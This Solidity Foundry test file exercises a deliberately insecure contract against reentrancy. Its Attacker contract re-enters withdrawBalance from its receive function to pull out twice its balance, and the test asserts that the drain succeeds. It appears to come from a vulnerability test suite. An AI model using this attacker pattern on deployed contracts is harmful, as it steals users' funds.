
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Reentrancy_insecure} from "../src/Reentrancy_insecure.sol";
import {stdStorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";

contract TestReentrancyReentrancy_insecure is Test {
    using stdStorage for StdStorage;

    Reentrancy_insecure public _contractUnderTest;
    
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new Reentrancy_insecure();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal > 0 && attackVal <= type(uint128).max);
        

        stdstore.target(address(_contractUnderTest)).sig(Reentrancy_insecure.userBalances.selector).with_key(address(_attacker)).checked_write(attackVal);
        
        vm.deal(address(_contractUnderTest), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);

        
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    Reentrancy_insecure public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;

    uint256 public attackValStored;

    constructor(address victimAddress) { 
        victim = Reentrancy_insecure(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        attackValStored = val;
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        victim.withdrawBalance();

        uint256 finalBalance = address(this).balance;
        if (finalBalance == initialSnapshot + attackValStored * 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.withdrawBalance();
        }
    }
}
